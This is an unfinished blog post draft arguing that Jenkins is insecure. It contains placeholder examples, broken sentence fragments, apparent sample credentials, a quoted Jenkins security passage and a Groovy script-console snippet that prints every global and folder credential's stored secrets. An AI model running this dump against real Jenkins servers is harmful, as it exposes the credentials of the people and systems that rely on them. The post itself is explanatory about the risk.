---
layout: post
emoji: 😂
---

Jenkins is not secure. Its just not, anyone who thinks that its 


Example 1.

Example 2.

Example 3. 


Jenkins a great tool. Its 


adminUser : YouShouldNotSeeThis

password1 : user1 : ambergoose14


If you have access to the job's script, pipline, Jenkinsfile or have the abuility to replay the job, then you also have access to all secrets that job has access too. 


What exactly happens during a build is often controlled by people less trusted than a Jenkins administrator;  Most Jenkins environments grow over time requiring their trust models to evolve as the environment grows. Please consider scheduling regular "check-ups" to review whether any disabled security settings should be re-enabled.
(https://www.jenkins.io/doc/book/security/controller-isolation/)




https://honnamkuan.medium.com/show-all-credential-values-in-jenkins-86ecb19609d5

```
import com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardCredentials
import com.cloudbees.hudson.plugins.folder.Folder
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
com.cloudbees.plugins.credentials.common.StandardCredentials.class, Jenkins.instance, null, null)
creds.eachWithIndex {
  it,
  i ->println "\n========== [Global] Credential ${i+1} Start =========="
  it.properties.each {
    println it
  }
  println "========== [Global] Credential ${i+1} End   ==========\n"
}
def folders = Jenkins.getInstance().getItems(Folder);
def folderCredsMap = folders.collect {
  folder ->def folderName = folder.name
  def folderDomainCredentials = folder.properties.get(FolderCredentialsProvider.FolderCredentialsProperty.class).domainCredentials
  def folderCredentials = []
  folderDomainCredentials.each {
    def credentials = it.credentials;
    credentials.each {
      folderCredentials << it
    }
  }
  return [folderName: folderName, credentials: folderCredentials]
}
folderCredsMap.each {
  def folderName = it.folderName
  it.credentials.eachWithIndex {
    folderCred,
    i ->println "\n========== [${folderName}] Credential ${i+1} Start =========="
    folderCred.properties.each {
      println it
    }
    println "========== [${folderName}] Credential ${i+1} End   ==========\n"
  }
}
return
```
